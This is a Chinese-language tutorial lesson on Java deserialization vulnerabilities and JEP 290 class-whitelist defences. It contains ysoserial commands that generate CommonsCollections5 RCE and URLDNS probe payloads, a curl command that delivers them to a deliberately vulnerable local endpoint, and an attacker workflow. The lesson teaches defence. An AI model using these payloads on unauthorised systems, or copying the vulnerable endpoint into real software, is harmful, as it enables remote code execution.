## 为什么要学

这一课是你作为 Java 开发者学安全时**天然的主场**。序列化你天天在用：Dubbo/RMI 传对象、Redis 缓存里存 `Serializable` 对象、Session 持久化、Shiro 的 rememberMe Cookie、消息队列里的对象消息——它们背后往往就是 `ObjectOutputStream`/`ObjectInputStream`。别人要花很久才理解的 gadget chain（利用链），对你来说只是"一堆 Java 类的方法在反序列化时被自动串起来调用"而已。

把反序列化搞透，你就一次性理解了一大批历史漏洞的同一个根：Commons Collections 系列、WebLogic/JBoss 的 T3/RMI、Shiro-550、Fastjson autoType、Jackson 多态、XStream。它们表面是不同组件的 CVE，本质都是"把不可信字节变成了任意对象、进而触发了任意方法调用"。这也是 [[web-rce]] 里 RCE 的一条重要来路。

学完这一课你应该能做到：讲清楚 `readObject` 为什么危险、gadget chain 是怎么"接龙"的；用 ysoserial 打一个你自己搭的漏洞接口；说清 Fastjson autoType 和 Jackson `enableDefaultTyping` 为什么等价于"JSON 版的反序列化漏洞"；并用 JEP 290 的 `ObjectInputFilter` 写出 JVM 级和单流级两种白名单防护。

:::warn 授权原则
本课的 payload 和 ysoserial 只能打你自己的机器、本仓库的 Lab，或你有明确书面授权的目标。对他人系统投递反序列化 payload 可能直接构成入侵，属于违法行为。
:::

## 核心概念

### 1. Java 原生序列化与 readObject 的"魔法钩子"

一个类实现 `java.io.Serializable`（一个空的标记接口），它的实例就能被 `ObjectOutputStream.writeObject()` 变成字节流，再被 `ObjectInputStream.readObject()` 还原。字节流以魔数 `AC ED 00 05` 开头（Base64 常见前缀 `rO0AB`），看到它基本可断定是 Java 原生序列化数据。

关键在于：反序列化**不是**简单地"new 一个对象再逐字段赋值"。`ObjectInputStream` 会检查每个类有没有下面这些"魔法方法"，有就自动调用——注意，这发生在你拿到对象、还没写任何业务代码之前：

- `private void readObject(ObjectInputStream in)`：最常被利用的入口钩子。
- `readResolve()` / `readObjectNoData()`：替换/补全反序列化结果。
- 反序列化过程中还会隐式调用一些容器类的方法，例如 `HashMap` 还原时会对每个 key 调用 `hashCode()`、比较时调用 `equals()`；`TreeMap`/`PriorityQueue` 会调用 `compareTo()`/`Comparator.compare()`。

这就是危险的根源：**攻击者只要控制字节流，就能控制"哪些类被实例化、哪些方法在反序列化期间被自动调用"**。类型是攻击者说了算的——流里写的是哪个类名，`ObjectInputStream` 就加载哪个类（只要 classpath 上有）。默认情况下**没有任何白名单**。于是攻击者的目标变成：在你的 classpath 里，找一串类,让这些"自动被调用的方法"像多米诺骨牌一样接龙,最终拼出"执行任意命令"。这串类就叫 **gadget chain（利用链）**,而寻找它的人不需要你的源码,只需要和你相同的依赖。

### 2. gadget chain：以 Commons Collections 为例逐环拆解

Apache Commons Collections（CC）是 Java 世界最经典的 gadget 来源。它是极其常见的间接依赖，2015 年被 FoxGlove Security 用来批量打穿 WebLogic、JBoss、Jenkins。它提供了一个太"好用"的积木：`Transformer` 接口，表示"把一个对象变换成另一个对象"。链条大致这样接龙（以 CC 3.1 的经典 TransformedMap 链为例）：

```
readObject 触发点  --->  Map 操作  --->  Transformer 链  --->  反射调用  --->  命令执行
AnnotationInvocationHandler         入口：其 readObject 会遍历 Map 并对 entry 调用 setValue()
   |
   v
TransformedMap                      被包成"每次 setValue 都跑一个 Transformer 变换"
   |
   v
ChainedTransformer                  把多个 Transformer 串起来，前一个输出喂给后一个
   |
   v
ConstantTransformer(Runtime.class)  第一步：无视输入，直接吐出 Runtime 这个 Class
   |
   v
InvokerTransformer("getMethod",...) 反射拿到 Runtime.getRuntime 方法
   |
   v
InvokerTransformer("invoke",...)    反射调用它，得到 Runtime 单例
   |
   v
InvokerTransformer("exec", "calc")  反射调用 exec 执行命令
```

拆开看每一环做了什么：入口是某个类的 `readObject`（不同 CC 版本用不同入口，如 `AnnotationInvocationHandler`、`LazyMap`、`TiedMapEntry` + `HashSet`）在反序列化时会去"碰"一个 Map；这个 Map 被换成了 `TransformedMap`/`LazyMap`，它的特性是"访问时自动跑一个 `Transformer`"；这个 Transformer 是 `ChainedTransformer`，把一串变换首尾相接；链里用 `InvokerTransformer` 做反射，等价于手写 `Runtime.getRuntime().exec("calc")`,只是全部改用反射拼出来,这样就能被序列化保存。**攻击者只是提前把这串对象组装好、序列化成字节；你的 `readObject` 帮他把它们"播放"了一遍。**

关键认知：漏洞不在"你调用了 exec",你根本没写这行代码;漏洞在"你反序列化了不可信数据",而 classpath 上恰好躺着能被拼成 exec 的积木。

### 3. 为什么"升级 Commons Collections"治标不治本

这是本课的核心问题。很多团队爆出 CC 漏洞后，第一反应是"把 commons-collections 升到修复版"。新版确实给 `InvokerTransformer` 等类做了限制（默认不再允许反序列化这类危险 Transformer），这条**具体链**是断了。但问题的根不在 CC：

- 根在 `ObjectInputStream` 默认"来者不拒"——只要 classpath 上有类，就允许反序列化任意类型。CC 只是众多"积木供应商"之一。
- gadget 链是**可替换**的。研究者陆续发现了大量新链：CC 的其他版本入口、Commons BeanUtils、Groovy、Spring（`spring-core` 的 `AbstractPointcutAdvisor`）、Hibernate、C3P0、Rome、JDK 自带的 `Runtime`/JNDI 相关类等等。你项目里几乎一定有其中某个。
- 也就是说：升级 CC 好比"你家门锁被撬了，你只把这一把锁换了"，可小偷手里有一整串万能钥匙,换一把继续开。ysoserial 里几十条 payload 就是这串钥匙。

正确的思路是把防线放在**入口**：能不用原生反序列化就不用（改用 JSON 且不开多态）；必须用时，用 JEP 290 的 `ObjectInputFilter` 做**类白名单**（只允许你确实需要反序列化的少数类），而不是去追着某个库打补丁。白名单默认拒绝，才和"gadget 链无穷无尽"这个现实匹配。这也呼应了整条学习路线反复出现的原则：**默认拒绝、在信任边界处校验**。

### 4. ysoserial：gadget chain 的"军火库"

`ysoserial`（frohoff/ysoserial，见本主题资料）是一个把上述 gadget chain 工程化的工具。你不用手写反射链，它内置了几十条 payload 生成器（`CommonsCollections1`~`7`、`CommonsBeanutils1`、`Spring1/2`、`Groovy1`、`Jdk7u21`、`URLDNS` 等），每条对应一个库/版本的利用链。

它的原理很朴素：按你选的链，在内存里把那串 gadget 对象**组装好**，用 `ObjectOutputStream` 序列化成字节，输出到 stdout。你把这段字节投递到目标的反序列化入口，目标 `readObject` 时就"播放"了这条链。用法：

```
# 生成一条 CC 链 payload，命令是弹计算器（Linux 上换成 'touch /tmp/pwned'）
java -jar ysoserial.jar CommonsCollections5 'calc' > payload.bin

# URLDNS 链：不依赖任何第三方库，只让目标发一次 DNS 请求，专门用来"探测"目标是否存在反序列化点
java -jar ysoserial.jar URLDNS 'http://<你的DNSlog域名>' > probe.bin
```

`URLDNS` 特别值得记：它只用 JDK 自带的 `HashMap`+`URL`，`URL.hashCode()` 会触发一次 DNS 解析。它不能执行命令,但能在你不确定目标有没有危险依赖时,先确认"反序列化点确实存在且能被触发"——收到 DNS 请求就说明命中了。这与 [[web-ssrf]]、[[web-rce]] 里"盲打先用带外(OOB)探测"的思路完全一致。

要让某条 RCE 链真正生效，目标的 classpath 上必须有对应版本的库(比如 `CommonsCollections5` 需要相应的 CC 版本)。所以攻击者往往先用 URLDNS 确认入口,再根据目标技术栈逐条试不同链。

### 5. JSON 多态反序列化：Fastjson autoType 与 Jackson default typing

很多人以为"我们早就不用 Java 原生序列化了，都走 JSON，所以安全"。这是最大的误解之一。问题不在字节格式，而在**是否让输入决定要实例化哪个类**。一旦 JSON 里能写"类名"并被照做，就等价于反序列化漏洞——只是钥匙从 `AC ED` 变成了一段 JSON。

**Fastjson（autoType）**：Fastjson 1.x 支持在 JSON 里用 `@type` 字段指定目标类，例如 `{"@type":"com.example.User","name":"a"}`。这个特性叫 autoType。攻击者把 `@type` 换成一个"构造时/取值时会产生副作用"的类（历史上常见的是能触发 JNDI 查询、进而 RCE 的数据源类，如某些 JdbcRowSet/DataSource 实现），就能像 gadget chain 一样借 JSON 反序列化触发 RCE。Fastjson 后来引入了 autoType 黑白名单并默认关闭 autoType，但历史上是"黑名单不断被绕过、再打补丁"的拉锯——又一个"黑名单打不完"的例子。防御结论：升级到维护中的版本(如 Fastjson 2，或改用其它库)、**绝不开启 autoType**、对来自外部的 JSON 尤其如此。

**Jackson（default typing）**：Jackson 默认是安全的——它按你 DTO 的字段类型来绑定，不允许 JSON 指定任意类。危险的是你**主动**打开多态：调用 `ObjectMapper.enableDefaultTyping()`(旧 API)或用 `activateDefaultTyping(...)` 配一个过宽的校验器,或在字段上用 `@JsonTypeInfo(use = Id.CLASS)`。这些会让 Jackson 把 JSON 里的类名当作要实例化的类,和 autoType 同源。CVE 编号众多但机理一致。防御:不要全局开 default typing;确实需要多态时,用 `@JsonTypeInfo(use = Id.NAME)` + `@JsonSubTypes` 显式登记允许的子类(相当于白名单),或配置 `PolymorphicTypeValidator` 只允许特定基类下的子类型。

### 6. 防御的核心：JEP 290 序列化过滤器与类白名单

JEP 290（"Filter Incoming Serialization Data"，见资料，自 JDK 9 起提供，并回移植到 8u121+）给 `ObjectInputStream` 加了一道"在真正实例化每个类之前先问一句能不能放行"的钩子——`ObjectInputFilter`。它就是我们要的**入口白名单**。

过滤器用一种 pattern 字符串描述规则，从左到右匹配，第一条命中的规则决定放行(`ALLOWED`)还是拒绝(`REJECTED`);`!` 表示拒绝,`*` 是通配,`.**` 匹配包及子包,还能限制最大数组长度/深度/引用数。经典写法是"先只允许我需要的,再拒绝其余一切":

```
maxbytes=10000;maxdepth=20;com.aqin.mynotes.dto.*;java.lang.*;java.util.*;!*
```

含义：限制字节数与深度；只允许这几个包下的类；`!*` 兜底拒绝所有其它类。注意即使有白名单，也要配额度限制，防止"允许的类"被用来做 DoS（如超大数组）。

**方式一：JVM 级全局过滤器**（对整个进程所有反序列化生效，最省心的兜底）。用系统属性 `jdk.serialFilter` 设置：

```
java -Djdk.serialFilter='maxbytes=10000;java.base/*;com.aqin.mynotes.dto.*;!*' -jar app.jar
```

也可以写在 `conf/security/java.security` 的 `jdk.serialFilter=` 里做成部署基线。JDK 9+ 还有 `jdk.serialFilterFactory` 可做更细的按流选择。

**方式二：单流过滤器**（对某个具体的、已知类型很窄的反序列化点收紧到最严）。在 Java 17 里代码这样写:

```java
import java.io.*;

public final class SafeDeserializer {
    // 只允许反序列化 Order 这一个类（及必要的 JDK 基础类型），其余全拒绝
    private static final ObjectInputFilter FILTER = ObjectInputFilter.Config.createFilter(
        "com.aqin.mynotes.dto.Order;java.lang.*;java.util.*;!*");

    public static Order read(byte[] data) throws IOException, ClassNotFoundException {
        try (var bais = new ByteArrayInputStream(data);
             var ois = new ObjectInputStream(bais)) {
            ois.setObjectInputFilter(FILTER);   // 关键：实例化任何类之前先过滤
            Object obj = ois.readObject();
            if (!(obj instanceof Order order)) {
                throw new InvalidClassException("unexpected type: " + obj.getClass());
            }
            return order;
        }
    }
}
```

`ObjectInputFilter.Config.createFilter(...)` 按上面的 pattern 生成过滤器；`setObjectInputFilter` 必须在 `readObject` **之前**设置。当流里出现 `!*` 命中的类（比如某个 gadget 入口类），`readObject` 会抛 `InvalidClassException: filter status: REJECTED`，链在"实例化第一个 gadget 类"这一步就断了，根本轮不到反射调用。这正是"升级 CC 治不了、白名单能治"的落地。

关于 **Oracle《Secure Coding Guidelines for Java SE》**（见资料）：它把序列化专门列了一节（Serialization and Deserialization），核心建议与本课一致——把反序列化不可信数据视为高危；对敏感类实现 `readObject`/`readResolve` 时做校验、必要时抛异常拒绝还原；用序列化过滤器限制可反序列化的类；能避免实现 `Serializable` 就避免。把它当权威清单对照即可，不必背条款号。

## 动手实践

### 实践 1（Lab 08）：用 ysoserial 打自建漏洞接口，再用过滤器修复

本仓库的 Lab 08 尚未内置，这里带你从零搭一个最小漏洞点、打通、再修复，效果一样。

第一步，在你本机的练习工程里写一个"接收 Base64 序列化数据并反序列化"的漏洞接口（这是很多"存 Redis/Cookie 里的对象""RMI 入参"的简化模型）：

```java
@RestController
class VulnDeserController {
    // 漏洞版：直接反序列化不可信输入，无任何过滤
    @PostMapping("/vuln/l08")
    String vuln(@RequestBody String base64) throws Exception {
        byte[] data = java.util.Base64.getDecoder().decode(base64);
        try (var ois = new ObjectInputStream(new ByteArrayInputStream(data))) {
            Object o = ois.readObject();   // 危险点
            return "read: " + o.getClass().getName();
        }
    }
}
```

为了让 CC 链能生效，练习工程里要**故意**引入一个存在漏洞的旧版 Commons Collections（仅用于本地实验，用完删掉）。这一步就是在还原"你项目里恰好有这个间接依赖"的现实。

第二步，构建 ysoserial 并生成 payload。先从 GitHub 克隆 `frohoff/ysoserial` 用 Maven 打包（`mvn clean package -DskipTests`，产物在 `target/` 下），再生成一条会创建文件的 payload，并 Base64 编码后投递：

```
# 生成 payload（Linux/macOS：执行 touch 便于观察；命令随链而定，这里用 CommonsCollections5）
java -jar ysoserial.jar CommonsCollections5 'touch /tmp/pwned_l08' | base64 > payload.b64

# 投递到漏洞接口
curl -s -X POST http://127.0.0.1:8080/vuln/l08 \
  -H 'Content-Type: text/plain' --data-binary @payload.b64
```

预期现象与如何读：

```
# 接口返回（说明 readObject 成功走完了链）：
read: java.util.HashMap

# 关键证据——命令真的被执行了：
$ ls -l /tmp/pwned_l08
-rw-r--r--  1 you  wheel  0 ... /tmp/pwned_l08
```

`/tmp/pwned_l08` 出现，就证明"你没写任何 exec，却因为一次 `readObject` 执行了任意命令"。如果换成 `URLDNS` 链并用一个 DNSlog 域名，你会在 DNSlog 平台看到一次解析记录——这就是盲场景下的探测方式。若某条链没生效（报 `ClassNotFoundException` 或无反应），通常是该链需要的库/版本不在 classpath，换一条链或对齐依赖版本再试。

第三步，用单流 `ObjectInputFilter` 修复。把接口改成设置白名单过滤器后再读（复用上面 `SafeDeserializer` 的思路，这里假设业务只需还原一个 `Note` 对象）：

```java
@PostMapping("/secure/l08")
String secure(@RequestBody String base64) throws Exception {
    byte[] data = java.util.Base64.getDecoder().decode(base64);
    var filter = ObjectInputFilter.Config.createFilter(
        "com.aqin.mynotes.dto.Note;java.lang.*;java.util.*;!*");
    try (var ois = new ObjectInputStream(new ByteArrayInputStream(data))) {
        ois.setObjectInputFilter(filter);   // 先过滤，再 readObject
        return "read: " + ois.readObject().getClass().getName();
    }
}
```

再打一次同样的 payload，预期变成：

```
# 服务端日志抛出（并返回 500 / 你自定义的 400）：
java.io.InvalidClassException: filter status: REJECTED

# /tmp 下不再出现 pwned 文件——链在实例化第一个 gadget 类时就被拦下
```

看到 `filter status: REJECTED`、且没有副作用文件，就说明白名单在"实例化任意 gadget 类之前"生效了。想做成部署级兜底，可再用 `-Djdk.serialFilter=...` 给整个 JVM 加一层全局过滤，两层叠加。最后别忘了把练习用的旧版 CC 依赖删掉。

### 实践 2：完成 PortSwigger Insecure deserialization 实验

到 PortSwigger Web Security Academy 的 Insecure deserialization 模块（见资料）从 Apprentice 级做起。它多以 PHP/Java 的序列化 Cookie 为场景：先学会识别序列化数据（Java 看 `AC ED`/`rO0`，PHP 看 `O:` 前缀），修改字段（如把 `admin` 从 0 改成 1）实现越权,再进阶到用现成 gadget 链 RCE。做完把"识别→篡改→利用链"三步记进笔记,和上面的 Lab 08 对照。

## 攻击者视角

攻击者的流程通常是：**找入口 → 探测 → 选链 → 利用**。

- 找入口：任何"把外部字节还原成对象"的地方都是候选——`ObjectInputStream` 直接调用、RMI/JMX/T3 等协议、可反序列化的 Cookie（Shiro rememberMe）、缓存里的对象、消息队列对象消息、开了 autoType 的 Fastjson 或开了 default typing 的 Jackson。抓包看到 `AC ED`/`rO0AB` 或可控的 `@type` 字段就要警觉。
- 探测：先用 `URLDNS` 或带 DNSlog 的链做带外探测，不追求 RCE，只确认"这个点会触发反序列化"。
- 选链：根据响应头、报错、依赖指纹判断技术栈，再从 ysoserial 里挑对应库/版本的链。
- 利用：投递 RCE payload，落地后就是 [[web-rce]] 的后续（反弹 shell、读云元数据、横向移动）。在云上这一步常和 [[web-ssrf]] 汇合，危害被放大。

## 防御与最佳实践

一句话优先级：**首选不反序列化不可信数据；不得不做时，用白名单过滤器把入口锁死。**

- 首选替代方案：跨系统传数据用 JSON，且**不开启多态类型**（Fastjson 关 autoType、Jackson 不用 default typing）。数据就是数据，不要让它携带"类型指令"。
- 必须用原生序列化时：给 `ObjectInputStream` 设 `ObjectInputFilter` 白名单（单流 + `-Djdk.serialFilter` 全局两层），并限制 `maxbytes`/`maxdepth`/数组长度防 DoS。
- 依赖治理：用依赖扫描（如 OWASP Dependency-Check、`mvn dependency:tree`）盘点 CC、Fastjson、Jackson、C3P0、Groovy 等已知 gadget 来源，及时升级；但记住升级只是收窄，白名单才是根治。
- 收敛入口：不把 RMI/JMX、Redis、消息队列等含反序列化的端口暴露到不可信网络（呼应 [[linux-net]] 的"内网服务只监听内网"）。
- Cookie/Token 不放可反序列化对象；需要在客户端存状态就用签名过的 JWT（[[web-authn]]），而不是序列化对象。
- 纵深与检测：以最小权限运行应用（[[linux-perm]]，被 RCE 后危害更小）；对反序列化异常（`InvalidClassException: REJECTED`）打日志告警，它往往就是一次攻击尝试。

## 常见误区

- **"我们用 JSON 不用原生序列化，所以没这问题。"** 只要让输入决定实例化哪个类（Fastjson autoType、Jackson default typing），JSON 一样能 RCE。
- **"升级了 Commons Collections 就安全了。"** 只断了一条具体链，gadget 来源还有很多。要在入口做白名单。
- **"payload 里没有我的业务类，反序列化应该没事。"** 危险恰恰来自 JDK 和第三方库里的类在 `readObject`/`hashCode`/`compare` 时的副作用，跟你的业务类无关。
- **"先反序列化成对象，再用 `instanceof` 判断类型就安全了。"** 太晚了——链在 `readObject` 过程中就已经执行完，等你判断时命令早跑完了。校验必须在实例化前（用过滤器）。
- **"HTTPS/加密传输能防反序列化。"** 传输安全和"是否信任内容"是两回事，攻击者可以用合法通道发恶意字节。
- **"gadget chain 需要源码或很深的功底才能用。"** ysoserial 已经把它变成一条命令，门槛很低——所以防守方更不能心存侥幸。

## 自测

:::details 1. `ObjectInputStream.readObject` 为什么危险？谁决定实例化哪个类？
因为反序列化会按流里写的类名加载并实例化类，并自动调用 `readObject`/`readResolve`，以及容器还原时的 `hashCode`/`equals`/`compareTo` 等方法。默认没有白名单，类型由**攻击者提供的字节流**决定。攻击者据此把 classpath 上的类串成 gadget chain，在你写任何业务代码前就触发任意方法调用甚至 RCE。
:::

:::details 2. 用你自己的话描述 Commons Collections 链是怎么"接龙"到 exec 的。
某入口类的 `readObject` 在反序列化时会去操作一个 Map；这个 Map 被换成 `TransformedMap`/`LazyMap`，访问时会自动执行 `Transformer`；这个 Transformer 是 `ChainedTransformer`，把多个变换首尾相连；链里用 `ConstantTransformer` 吐出 `Runtime` 类，再用几个 `InvokerTransformer` 反射调用 `getRuntime().exec(cmd)`。整条链被攻击者提前组装、序列化，你的 `readObject` 负责"播放"。
:::

:::details 3. 为什么"升级 Commons Collections"不能从根本上解决反序列化问题？
因为根因是 `ObjectInputStream` 默认允许反序列化任意类，CC 只是众多 gadget 来源之一。升级只断了这一条链，攻击者可换 BeanUtils、Groovy、Spring、C3P0 等其它链。根治要在入口用 `ObjectInputFilter` 类白名单（默认拒绝），或干脆不反序列化不可信数据。
:::

:::details 4. ysoserial 的 URLDNS 链有什么特殊用途？
它只依赖 JDK 自带类（`HashMap`+`URL`），`URL.hashCode()` 会触发一次 DNS 解析。它不能执行命令，但不需要目标有任何第三方 gadget 库，因此常用于**带外探测**：确认目标反序列化点是否存在且能被触发。收到 DNS 请求即命中。
:::

:::details 5. Fastjson autoType 和 Jackson default typing 为什么等价于反序列化漏洞？
两者都允许 JSON 中的类名（Fastjson 的 `@type`、Jackson 开启 default typing 后的类型信息）决定要实例化的类。这就把"输入决定类型"引入了 JSON，攻击者可指定会产生危险副作用的类，机理与原生反序列化 gadget 完全相同。防御：Fastjson 关 autoType、升级到维护版本；Jackson 不全局开 default typing，需要多态时用 `@JsonTypeInfo(use=Id.NAME)`+`@JsonSubTypes` 或 `PolymorphicTypeValidator` 做白名单。
:::

:::details 6. 用 `ObjectInputFilter` 防护时，为什么必须在 `readObject` 之前 `setObjectInputFilter`？pattern `com.aqin.mynotes.dto.Order;java.util.*;!*` 是什么意思？
因为过滤发生在"实例化每个类之前"，只有先设置过滤器，`readObject` 才会对流中每个类调用它；设置晚了链已经执行。该 pattern 从左到右匹配：允许 `Order` 类、允许 `java.util` 包下的类，`!*` 兜底拒绝其余一切类——即默认拒绝的白名单。
:::

:::details 7. JVM 全局过滤器和单流过滤器分别怎么配？各适合什么场景？
全局：启动加 `-Djdk.serialFilter='...;!*'`，或写进 `java.security` 的 `jdk.serialFilter`，对整个进程所有反序列化生效，适合做部署级兜底。单流：对某个 `ObjectInputStream` 调用 `setObjectInputFilter(...)`，可收到最窄（只允许该点真正需要的类），适合已知类型的具体反序列化点。两者可叠加。
:::

:::details 8. 为什么说反序列化 RCE 在云上危害更大？它和 SSRF、命令注入是什么关系？
反序列化 RCE 落地后即获得进程执行能力，在云上可进一步访问元数据地址（169.254.169.254）窃取临时凭证、横向移动，危害被放大。它是通往 [[web-rce]] 的一条路径，落地后常与 [[web-ssrf]] 汇合；三者都体现"不可信输入被当作代码/指令执行"这同一根问题。
:::

## 一句话总结

Java 反序列化的根问题是 `ObjectInputStream` 默认允许把不可信字节还原成任意类型、并在此过程中自动触发方法调用，于是 classpath 上的类被串成 gadget chain 达成 RCE；升级某个库只能断一条链，真正的解法是不反序列化不可信数据、或在入口用 `ObjectInputFilter` 类白名单默认拒绝——JSON 的 autoType/default typing 只是同一问题的另一副面孔。
